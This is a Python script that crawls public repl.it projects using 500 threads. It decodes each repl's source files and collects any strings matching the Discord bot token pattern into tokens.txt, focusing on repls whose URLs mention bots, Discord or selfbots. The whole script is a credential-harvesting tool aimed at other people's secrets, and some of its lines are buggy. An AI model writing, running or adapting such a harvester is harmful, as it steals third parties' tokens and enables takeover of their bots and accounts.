import requests, json, base64, re, random, time, uuid
from bs4 import BeautifulSoup
from threading import Thread

class queue:
	queue=['https://repl.it/site/repls']
	checked=[]


def scrapepos(indexpos):
	currenturl=queue.queue[indexpos]
	del queue.queue[indexpos]
	print(f'Scraping: [ {currenturl} ]')
	soup=BeautifulSoup(requests.get(currenturl).text,'html.parser')
	if re.match('https?:\/\/repl.it\/@(([^/]+){3,15})\/(.{1,60})',currenturl)!=None:
		try:
			json1=soup.findAll('script',text=True)[-1].text.strip()
			json1=json.loads(json1[json1.find('{'):].splitlines()[0])
			files=json1['props']['initialState']['files']
			for i in files.values():
				code=base64.b64decode(i['content']['asEncoding']['base64']).decode('utf8')
				code=''.join(code.split())
				regex='([A-z0-9]{24})\.([A-z0-9-]{6})\.([A-z0-9-]{27})'
				r=re.search(regex,code)
				if r!=None:
					open('tokens.txt','a').write(f'\nFound token in {currenturl}: '+r.group())
					print(f'Found token in {currenturl}: {g}{r.group()}{r}')
		except:
			return
	else:
		for link in soup.findAll('a'):
			currenturl=link.get('href')
			if currenturl==None:continue
			try:
				if currenturl[0]=='.':continue
				if currenturl[0]=='/':currenturl='https://repl.it'+currenturl
				if not currenturl.startswith('http'):currenturl='https://repl.it/'+currenturl
				if currenturl not in queue.queue and uuid.uuid3(uuid.NAMESPACE_URL,currenturl) not in queue.checked:
					if currenturl.startswith('https://repl.it'):
						if 'bot' in currenturl.lower() or 'discord' in currenturl.lower() or 'selfbot' or 'replbot' in currenturl.lower() or 'antinuke' in currenturl.lower() or 'exeter' in currenturl.lower() in currenturl.lower() or currenturl.startswith('https://repl.it/site/repls') or re.match('(https:\/\/repl.itDELETETHIS\/@)[A-z0-9]{3,15}$',currenturl)!=None:
							queue.queue.append(currenturl)
							queue.checked.append(uuid.uuid3(uuid.NAMESPACE_URL,currenturl))
			except:
				continue

print('...')
open('tokens.txt','w').write('\n...\n')
def scrape(threadid):
	while True:
		try:
			queue.queue=queue.queue[:10000]
			indexpos=random.randint(0,len(queue.queue)-1)
			scrapepos(indexpos)
		except:
			pass
for i in range(500):
	try:
		Thread(target=scrape,args=(i,)).start()
	except:
		pass
while True:
	time.sleep(1)